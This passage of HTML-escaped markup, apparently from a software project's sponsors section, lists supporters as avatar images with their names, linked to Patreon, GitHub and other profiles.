href="https://x.com/RalFingerLP" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://pbs.twimg.com/profile_images/919595465041162241/ZU7X3T5k_400x400.jpg" alt="RalFinger" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c8.patreon.com/4/200/53077895/M" alt="Marc" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/157407541/bb9d80cffdab4334ad78366060561520/eyJ3IjoyMDB9/2.png?token-hash=WYz-U_9zabhHstOT5UIa5jBaoFwrwwqyWxWEzIR2m_c%3D" alt="Tokio Studio srl IT10640050968" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/128354277/52c073d323924b02ada90c9eacc6b0a0/eyJ3IjoyMDB9/1.png?token-hash=Oc0mVzELN1s1r0lLQTEO_sfJ2lEMC3X-By2O2bG6h_Q%3D" alt="Alastair Green" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/134129880/680c7e14cd1a4d1a9face921fb010f88/eyJ3IjoyMDB9/1.png?token-hash=5fqqHE6DCTbt7gDQL7VRcWkV71jF7FvWcLhpYl5aMXA%3D" alt="Bharat Prabhakar" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/70218846/C" alt="Cosmosis" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/dylanzonix" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/167351340?v=4" alt="Dylan" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/30931983/54ab4e4ceab946e79a6418d205f9ed51/eyJ3IjoyMDB9/1.png?token-hash=j2phDrgd6IWuqKqNIDbq9fR2B3fMF-GUCQSdETS1w5Y%3D" alt="HestoySeghuro ." width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/4105384/J" alt="Jack Blakely" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/jakeblakeley" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/2407659?u=be0bc786663527f2346b2e99ff608796bce19b26&amp;amp;v=4" alt="Jake Blakeley" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/47255859/7d68bf494f7645a382875fbaf901bf90/eyJ3IjoyMDB9/1.jpeg?token-hash=GUJtLcSZhj0sEvBWB1EiLXEw0hVQxr2Mf7YMUharte0%3D" alt="momen sree" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/Slartibart23" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/133593860?u=31217adb2522fb295805824ffa7e14e8f0fca6fa&amp;amp;v=4" alt="Slarti" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/97985240/3d1d0e6905d045aba713e8132cab4a30/eyJ3IjoyMDB9/1.png?token-hash=fRavvbO_yqWKA_OsJb5DzjfKZ1Yt-TG-ihMoeVBvlcM%3D" alt="◊¢◊ï◊û◊® ◊û◊õ◊ú◊ï◊£" width="100" height="100" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;/p&gt; 
&lt;hr style="width:100%;border:none;height:2px;background:#ddd;margin:30px 0;" /&gt; 
&lt;p align="center"&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/44568304/a9d83a0e786b41b4bdada150f7c9271c/eyJ3IjoyMDB9/1.jpeg?token-hash=FtxnwrSrknQUQKvDRv2rqPceX2EF23eLq4pNQYM_fmw%3D" alt="Albert Bukoski" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/5048649/B" alt="Ben Ward" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/111904990/08b1cf65be6a4de091c9b73b693b3468/eyJ3IjoyMDB9/1.png?token-hash=_Odz6RD3CxtubEHbUxYujcjw6zAajbo3w8TRz249VBA%3D" alt="Brian Smith" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/494309/J" alt="Julian Tsependa" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/5602036/c7b6e02bab1241fc83ff5a0cedf19b43/eyJ3IjoyMDB9/1.jpeg?token-hash=nnd10QRNxqaHmhwr-zQh4EIlBDIFJEvt65YB3ebjhNw%3D" alt="Kelevra Quackenstien" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/358350/L" alt="L D" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/159203973/36c817f941ac4fa18103a4b8c0cb9cae/eyJ3IjoyMDB9/1.png?token-hash=zkt72HW3EoiIEAn3LSk9gJPBsXfuTVcc4rRBS3CeR8w%3D" alt="Marko jak" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/11198131/e696d9647feb4318bcf16243c2425805/eyJ3IjoyMDB9/1.jpeg?token-hash=c2c2p1SaiX86iXAigvGRvzm4jDHvIFCg298A49nIfUM%3D" alt="Nicholas Agranoff" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/785333/bdb9ede5765d42e5a2021a86eebf0d8f/eyJ3IjoyMDB9/2.jpg?token-hash=l_rajMhxTm6wFFPn7YdoKBxeUqhdRXKdy6_8SGCuNsE%3D" alt="Sapjes " width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/76566911/6485eaf5ec6249a7b524ee0b979372f0/eyJ3IjoyMDB9/1.jpeg?token-hash=mwCSkTelDBaengG32NkN0lVl5mRjB-cwo6-a47wnOsU%3D" alt="the biitz" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/83034/W" alt="william tatum" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/32633822/1ab5612efe80417cbebfe91e871fc052/eyJ3IjoyMDB9/1.png?token-hash=pOS_IU3b3RL5-iL96A3Xqoj2bQ-dDo4RUkBylcMED_s%3D" alt="Zack Abrams" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/25209707/36ae876d662d4d85aaf162b6d67d31e7/eyJ3IjoyMDB9/1.png?token-hash=Zows_A6uqlY5jClhfr4Y3QfMnDKVkS3mbxNHUDkVejo%3D" alt="fjioq8" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/46680573/ee3d99c04a674dd5a8e1ecfb926db6a2/eyJ3IjoyMDB9/1.jpeg?token-hash=cgD4EXyfZMPnXIrcqWQ5jGqzRUfqjPafb9yWfZUPB4Q%3D" alt="Neil Murray" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/julien-blanchon" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/11278197?v=4" alt="Blanchon" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/Wallawalla47" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/46779408?v=4" alt="Ian R" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c8.patreon.com/4/200/63510241/A" alt="Andrew Park" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/Spikhalskiy" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/532108?u=2464983638afea8caf4cd9f0e4a7bc3e6a63bb0a&amp;amp;v=4" alt="Dmitry Spikhalsky" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c8.patreon.com/4/200/88567307/E" alt="el Chavo" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/117569999/55f75c57f95343e58402529cec852b26/eyJ3IjoyMDB9/1.jpeg?token-hash=squblHZH4-eMs3gI46Uqu1oTOK9sQ-0gcsFdZcB9xQg%3D" alt="James Thompson" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/28533016/e8f6044ccfa7483f87eeaa01c894a773/eyJ3IjoyMDB9/2.png?token-hash=ak-h3JWB50hyenCavcs32AAPw6nNhmH2nBFKpdk5hvM%3D" alt="William Tatum" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Gage Siuniak" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/11180426/J" alt="jarrett towe" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/zappazack" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/74406132?u=356e66c964f9ca4859b274ff6788aebd16e218d4&amp;amp;v=4" alt="zappazack" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/91298241/1b1e6d698cde4faaaae6fc4c2d95d257/eyJ3IjoyMDB9/1.jpeg?token-hash=GCo7gAF_UUdJqz3FsCq8p1pq3AEoRAoC6YIvy5xEeZk%3D" alt="Daniel Partzsch" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://www.youtube.com/@happyme7055" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://yt3.googleusercontent.com/ytc/AIdro_mFqhIRk99SoEWY2gvSvVp6u1SkCGMkRqYQ1OlBBeoOVp8=s160-c-k-c0x00ffffff-no-rj" alt="Marcus Rass" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/59408413/a0530a7770b6444bafdf0bc9f589eff0/eyJ3IjoyMDB9/1.jpg?token-hash=BlbxZsQpgchtqjByDuW9T8NoFWmCor5sWI0umhUKNlA%3D" alt="ByteC" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/55160464/42d4719ba0834e5d83aa989c04e762da/eyJ3IjoyMDB9/1.jpeg?token-hash=_twZUkW3NREIxGUOWskUdvuZQGEcRv9XMfu5NrnCe5M%3D" alt="Chris Canterbury" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/7208949/D" alt="D G" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/33866796/7fd2a214fd5c4062b0dd63a29f8de5bd/eyJ3IjoyMDB9/1.png?token-hash=8s-7yi8GawIlqr0FCTk5JWKy26acMiYlOD8LAk2HqqU%3D" alt="James" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/84891403/83682a2a2d3b49ba9d28e7221edd5752/eyJ3IjoyMDB9/1.jpeg?token-hash=LVB6lta4BonhfPwSUnZIDmSW3IU-eEO4sXD7NSK367g%3D" alt="Koray Birand" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/63232055/2300b4ab370341b5b476902c9b8218ee/eyJ3IjoyMDB9/1.png?token-hash=R9Nb4O0aLBRwxT1cGHUMThlvf6A2MD5SO88lpZBdH7M%3D" alt="Marek P" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/902918/5344727418634dc7b7fe7709d515a1d9/eyJ3IjoyMDB9/2.jpg?token-hash=myqV_oclkicVk9BDrvTO50jyjxJJGZ8i7oVJHwc05to%3D" alt="Michael Carychao" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/179944/P" alt="Paul Kroll" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/31613309/434500d03f714dc18049306ed3f0165c/eyJ3IjoyMDB9/1.jpg?token-hash=acILbq09wxUfJe-G2nMYUYkvHJ88ZxkzU4JebRPw2P0%3D" alt="Theta Graphics" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/10876902/T" alt="Tyssel" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/137975346/b0ac50eb2432471897ce59ddf1cb6b3d/eyJ3IjoyMDB9/1.png?token-hash=6iqhqukfgHK2IjlwTMsmBj3vratcfJ9pmxCmRkBu22s%3D" alt="G√∂ran Burlin" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/84873332/H" alt="Htango2" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Gary Joseph" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="keonmin lee" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="yvggeniy romanskiy" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/89623281/28d0cb75fc68439d9491f4343966f56e/eyJ3IjoyMDB9/1.jpeg?token-hash=Zt5UxtzvxDJGTPVh5Yr5rTY8JrcDsni0Mi89nZuYrp4%3D" alt="michele carlone" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/48109692/4237f732212343448ee87f5badc26e2c/eyJ3IjoyMDB9/1.jpeg?token-hash=gGqrOyctiITIyPZgjmF6YQKNf6cS9OeY4waIav3OAiU%3D" alt="Yves Poezevara" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/88656169/dd8943d7421d41bb9a8eb99f6d1279da/eyJ3IjoyMDB9/1.jpeg?token-hash=wT5j273p5pV10l81yR6kYdfYHR_yQ81xUzr3OfcSf7s%3D" alt="Ame Ame" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/5155933/C" alt="Chris Dermody" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/63920575/D" alt="Dutchman5oh" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/27580949/97c7dd2456a34c71b6429612a9e20462/eyJ3IjoyMDB9/1.jpeg?token-hash=cASxwWk8joAXx4tUAHch5CvTiYBR2UOHMeJK6se5fl0%3D" alt="Gergely Mad√°csi" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/44200812/f84fd628abb243bbaded4203761aca29/eyJ3IjoyMDB9/1.png?token-hash=ArthznCCT4BqOSMj_9oP4ECWWHnrb8nYPUDZ6DqSvMU%3D" alt="kingroka" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/mertguvencli" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/29762151?u=16a906d90df96c8cff9ea131a575c4bc171b1523&amp;amp;v=4" alt="Mert Guvencli" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/174319926/f16dc35b5c4741bd9c79fac3a8c8044d/eyJ3IjoyMDB9/1.jpeg?token-hash=GvYgc-XaRGI8BPnoMOo_txDfW0BjVayFdcxkshPyrvg%3D" alt="Philip Ring" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/rickrender" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/121735855?u=a8187fe40cec7f3afdd7c4bb128e0cca500fc220&amp;amp;v=4" alt="renderartist" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/27667925/6dac043a087e4c498e842dfad193baae/eyJ3IjoyMDB9/1.jpeg?token-hash=0bSVQo7QMMdGxFazeM099gsR0wtf28_ZTXeLIHEbIVk%3D" alt="S.Hasan Rizvi" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/2986571/S" alt="stev " width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/2472633/fea4a2888ea74c029e282fcc7ba76dd0/eyJ3IjoyMDB9/1.jpeg?token-hash=9O0lv1GQqftKoo8my9NrWSrRzHu-3IT_6VpCjHYixL8%3D" alt="Teemu Berglund" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Joakim S√§llstr√∂m" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/2888571/65c717bd8a564e469c25aa5858f9821b/eyJ3IjoyMDB9/1.png?token-hash=zwMOgNEoC9hlr2KamiB7TG004gCfJ2exSRDO4dhxo5Q%3D" alt="Derrick Schultz" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/5233761/N" alt="Newtown " width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/7979776/P" alt="PizzaOrNot " width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/82707622/3f0de2ffd6eb4074ba91e81381146e1c/eyJ3IjoyMDB9/1.jpeg?token-hash=wk6wjILO2dDHJla7gn3MH9mEKl08e7PuBDwZRUtEQAw%3D" alt="Russell Norris" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/lirexxx" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/94787562?u=ed7e681cbc200269a081c4151d6adfa6ef728f85&amp;amp;v=4" alt="Dimitar A." width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Heikki Rinkinen" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Josh Lindo" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="StrictLine e.U." width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="The Rope Dude" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Till Meyer" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Valarm, LLC" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Valarm, LLC" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Xavier Climent" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/94453070/S" alt="Speedy2023" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/151413472/1f97b80a64fd4aa69412c065246eb83d/eyJ3IjoyMDB9/1.jpeg?token-hash=nfsls-Qt-4JatAmeloyK6SRuJgXfpCf1nxBkTK7QiI0%3D" alt="Richard Spain" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/14029622/d81798dedfad4bff8b2c76e55c7b695f/eyJ3IjoyMDB9/1.png?token-hash=1qP6r5SXiAjLEly9PMFbWMo7Bl9lPahSisCSsMqYNOw%3D" alt="A1PHA " width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/136770679/bfc06edc256e4e8c9d5e69669400ce80/eyJ3IjoyMDB9/1.png?token-hash=syeNGY9CgVD1D6v_EPNGafyTrzeXH_JMF3EAFyFJhvw%3D" alt="Ben May | sofsy" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/claygraffix" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/1283083?v=4" alt="claygraffix" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c8.patreon.com/4/200/22711368/C" alt="CrypticWit" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="David Hooper" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/7436837/K" alt="Ken Finlayson" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/14767188/1f22bccbf86b45a2b32642c3f5a493b3/eyJ3IjoyMDB9/1.png?token-hash=cJhOEsMXSv_d5fcqCu8Q_idyYtqc4UocsOaTflsSmT8%3D" alt="Kukee" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/93681621/d638ff4a9e0a40a7bc2c24bae4d6f353/eyJ3IjoyMDB9/1.png?token-hash=AxFFly1YYJskPzdkaU_M5jgyb0kZijSxB1Yb2AbE9h0%3D" alt="Manuel2Santos" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/138787313/c809120005024afa959231fe8b253fd9/eyJ3IjoyMDB9/1.png?token-hash=O6x0kkR4uKBsg_OODFHjZqwAupVztiZEOiXYF_7yKxM%3D" alt="Metryman55" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Rudolf Goertz" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/40431966/190f07a0828d4f8190539c518c7d3115/eyJ3IjoyMDB9/1.png?token-hash=co9yehrBdxsPSKQGDB-sGQNB_g3HPfg4pckMXoCU4Ck%3D" alt="ShadowForge" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Tommy Falkowski" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Victor-Ray Valdez" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/caleboleary" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/12816579?u=d7f6ec4b7caf3c4535385a5fa3d7c155057ef664&amp;amp;v=4" alt="Caleb O'Leary" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Florian Fiegl" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Karol Stƒôpie≈Ñ" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="manuel landron" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Paul Vu Nguyen" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/160878212/1c34e798b2a9420991bab7ccc0067463/eyJ3IjoyMDB9/1.jpeg?token-hash=V_omrlVIeWKw0vovf92DJHSft-fXiksP0Fqa-qbAUxM%3D" alt="Danwich Gaming" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/5752417/G" alt="Guillaume Roy" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/154134231/5d307160968b4c29922e2729bb555c99/eyJ3IjoyMDB9/1.jpeg?token-hash=dNP94e42G_A9CHO5zYfUunS2K80y3BPDHQ3NdzphNRY%3D" alt="Colin Boyd" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/122373805/d0d995f2a7d6483cbbe0e9b14391d1ed/eyJ3IjoyMDB9/1.png?token-hash=oQCZooskREZOB36TW0KNZASDeLc88yswNzF-PqcVQyw%3D" alt="DavidO" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/2697420/C" alt="Craig Penn" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/45804549/8117b86a8c4145348ed392d3ea8c9dde/eyJ3IjoyMDB9/2.png?token-hash=ej_ln6ecs0-Cija3vrXaWYFFyWEK2TWmItJE5ALWP4s%3D" alt="Jadev1311" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/194433979/a18cf671feef435c9a93080f11cc8cf3/eyJ3IjoyMDB9/1.png?token-hash=TN6zMy2-V1Wg5uSpZHstYAZAdb_DYk9Erk3XDjE8--M%3D" alt="Cyril Diagne" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/29010107/37b05d32281f460baa28b4a2d5f8dd52/eyJ3IjoyMDB9/3.jpg?token-hash=5FngEN5rK-hCAgHUM0EybhMTuHwRZI1gbbZyntuuH6g%3D" alt="Adel Gamal" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/15407925/B" alt="Brian M" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/17697321/C" alt="Chris Day" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img 